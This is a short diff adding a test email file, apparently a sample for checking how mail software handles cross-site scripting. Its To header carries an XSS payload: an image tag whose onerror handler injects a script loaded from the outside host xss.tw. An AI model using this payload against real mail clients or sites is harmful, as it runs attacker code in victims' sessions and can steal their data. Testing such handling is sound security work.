@@ -1,0 +1,7 @@
+From: Ivan <vojin56theodora@austin.rr.com>
+To: <"victim<img src=hi onerror=document.body.appendChild(createElement('script')).src='//xss.tw/4091'>@victim.com">
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
